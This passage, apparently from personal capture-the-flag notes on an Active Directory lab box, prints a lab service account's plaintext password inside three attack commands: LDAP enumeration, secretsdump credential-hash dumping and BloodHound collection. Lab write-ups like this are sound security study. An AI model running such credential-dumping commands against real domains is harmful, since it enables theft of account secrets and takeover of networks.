
Now with all the data we can figure that we have to retrive the password.

If you recall we have the note !!!
```
This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password).
```

![[Pasted image 20240919031500.png]]

I think we have to recover from AD recycle bin the password let's take the help of google fu and chat gpt

```
ldapdomaindump ldaps://10.10.10.182 -u 'Cascade.local\ArkSvc' -p 'w3lc0meFr31nd'
```


```
secretsdump.py Cascade.local/ArkSvc:'w3lc0meFr31nd'@10.10.10.182 
```


```
bloodhound-python -d Cascade.local -u ArkSvc -p 'w3lc0meFr31nd' -ns 10.10.10.182  -c all
```
![[Pasted image 20240919033540.png]]

